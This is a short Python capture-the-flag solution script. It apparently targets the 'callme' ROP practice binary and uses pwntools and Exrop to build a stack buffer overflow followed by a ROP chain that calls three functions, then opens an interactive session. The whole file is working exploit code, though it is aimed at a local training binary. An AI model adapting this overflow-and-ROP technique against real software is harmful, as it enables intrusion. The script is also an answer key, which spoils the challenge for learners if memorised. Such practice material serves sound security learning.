from pwn import *
from Exrop import Exrop

binname = "./callme"
p = process(binname)
elf = ELF(binname)
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']
rop = Exrop(binname)
rop.find_gadgets(cache=True)
chain1 = rop.func_call(callme_one, (1,2,3))
chain1.dump()
chain2 = rop.func_call(callme_two, (1,2,3))
chain2.dump()
chain3 = rop.func_call(callme_three, (1,2,3))
chain3.dump()
buf = b"A"*0x28
rop = chain1.payload_str() + chain2.payload_str() + chain3.payload_str()
pay = buf + rop
p.sendlineafter("> ", pay)
p.interactive()
